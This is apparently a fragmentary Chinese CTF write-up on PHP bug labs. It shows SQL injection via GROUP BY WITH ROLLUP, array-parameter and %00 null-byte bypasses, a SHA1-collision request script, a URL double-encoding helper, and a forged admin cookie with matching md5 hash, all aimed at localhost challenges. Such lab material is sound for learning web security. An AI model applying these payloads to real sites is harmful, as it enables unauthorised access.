...
uname=bb' GROUP BY pwd WITH ROLLUP LIMIT 1 OFFSET 1-- -&pwd=
...
http://localhost/php_bug/05.php?password[]=a
...
hash碰撞(https://security.googleblog.com/2017/02/announcing-first-sha1-collision.html)
...
r = requests.get('http://127.0.0.1/php_bug/07.php', params={'name': sha1, 'password': sha2})
print r.text
```
...
old_str = input('please input url_encode code:\n')
new_str1 = ''
new_str2 = ''
for j in old_str:
    new_str1 += '%' + hex(ord(j)).replace('0x', '')
new_str2 = new_str1.replace('%', '%25')
print('url_encode once:\t', new_str1)
print('url_encode twice:\t', new_str2)
```
...
此题构造：`http://127.0.0.1/php_bug/25.php?which=flag`
...
```php
file_get_contents()	//读取文件或网页的内容
```

五个通过条件

1. $a读取的url中不能有 . 且网页内容是1112 is a nice lab!
2. $id为真得情况下 $id = 0
3. $b 字符长度大于5
4. 取出 $b 第一个字符是4
5. $b 第一个字符不能是4

大致思路就是用%00来突破这些条件的限制
...
在写入cookie时，$_COOKIE 处理的cookie值中包含等号、空格、分号等特殊字符可能会导致数据丢失、或者不能解析的错误，对这些符号进行urlencode处理

通过条件

1. $role === "admin"

2. $hsh === md5($salt.strrev($_COOKIE["role"]))

```
Cookie:

hsh=f8c1de282a2bec048c349143bdd46105
role=s:5:"admin"%3b
```
